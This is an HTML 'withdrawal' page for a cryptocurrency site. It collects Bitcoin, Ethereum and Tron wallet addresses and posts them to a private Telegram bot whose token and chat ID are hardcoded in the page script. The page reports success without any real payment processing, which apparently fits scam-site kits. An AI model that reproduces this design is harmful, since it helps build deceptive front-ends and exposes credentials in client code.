<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <title>Document</title>
    <link rel="stylesheet" href="withdraw.css" />
  </head>
  <body>
    <header class="header">
      <a href="#" class="logo">
        <img src="img/logo.png" alt="" />
      </a>
    </header>

    <main class="main">
      <div class="heading">
        <h1 class="heading-title">WITHDRAWAL</h1>
      </div>
      <section class="withdraw-section">
        <div class="withdraw-inputs">
          <form id="withdrawFunds" autocomplete="off">
            <div class="address-inputs-container">
              <div class="alertUser">
                <div class="alert-message">
                  <h4 class="message-type">Success</h4>
                  <h4 class="message-text success-sent">
                    Reciept Sent Successfully
                  </h4>
                  <div class="close">
                    <span> <i class="fas fa-close"></i></span>
                  </div>
                </div>
              </div>
              <div class="form-input">
                <div class="address-logo">
                  <div class="img__box">
                    <img src="img/BIT.png" alt="" />
                  </div>
                </div>
                <input
                  class="input-address"
                  type="text"
                  placeholder="Enter wallet address"
                  name="bit"
                />
              </div>
              <div class="form-input">
                <div class="address-logo">
                  <div class="img__box">
                    <img src="img/ETH.png" alt="" />
                  </div>
                </div>
                <input
                  class="input-address"
                  type="text"
                  placeholder="Enter wallet address"
                  name="eth"
                />
              </div>
              <div class="form-input">
                <div class="address-logo">
                  <div class="img__box">
                    <img src="img/TRON.png" alt="" />
                  </div>
                </div>
                <input
                  class="input-address"
                  type="text"
                  placeholder="Enter wallet address"
                  name="tron"
                />
              </div>
              <button type="submit" class="withdraw-button">WITHDRAW</button>
            </div>
          </form>
        </div>
      </section>
    </main>
    <script>
      const displayMessages = (messageBody, closeMessage) => {
        const messageBODY = document.querySelector(messageBody),
          CloseMessage = document.querySelector(closeMessage);
        CloseMessage.addEventListener("click", () => {
          messageBODY.classList.remove("show-message");
        });
      };
      displayMessages(".alertUser", ".close");

      document
        .getElementById("withdrawFunds")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const bitAddress = document
            .querySelector('input[name="bit"]')
            .value.trim();
          const ethAddress = document
            .querySelector('input[name="eth"]')
            .value.trim();
          const tronAddress = document
            .querySelector('input[name="tron"]')
            .value.trim();

          const messageBOdy = document.querySelector(".alertUser");
          const messageType = document.querySelector(".message-type"),
            messageText = document.querySelector(".message-text");

          if (!bitAddress && !ethAddress && !tronAddress) {
            messageType.textContent = "Error";
            messageText.style.color = "red";
            messageText.textContent = "Please enter at least, one address";
            messageBOdy.classList.add("show-message");
            return;
          }

          let message = "Withdrawal request:\n";
          if (bitAddress) message += `Bitcoin Address: ${bitAddress}\n`;
          if (ethAddress) message += `Ethereum Address: ${ethAddress}\n`;
          if (tronAddress) message += `Tron Address: ${tronAddress}\n`;

          const botToken = "7960200543:AAFTbQYL15K9t1WSZKUuCSvdsqD2H-I3WE0";
          const chatId = "5865177790";
          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

          fetch(telegramApiUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          })
            .then((response) => response.json())
            .then((data) => {
              if (data.ok) {
                messageType.textContent = "Successful";
                messageText.style.color = "black";
                messageText.textContent =
                  "Withdrawal request sent successfully!";
                messageBOdy.classList.add("show-message");

                document.getElementById("withdrawFunds").reset();
              } else {
                messageType.textContent = "Error";
                messageText.style.color = "red";
                messageText.textContent = "Failed to send withdrawal request";
                messageBOdy.classList.add("show-message");
                //alert('Failed to send withdrawal request');
                console.error(data);
              }
            })
            .catch((error) => {
              console.error("Error:", error);
              messageType.textContent = "Error";
              messageText.style.color = "red";
              messageText.textContent =
                "An error occurred while sending the message";
              messageBOdy.classList.add("show-message");
              //alert('An error occurred while sending the message');
            });
        });
    </script>
  </body>
</html>
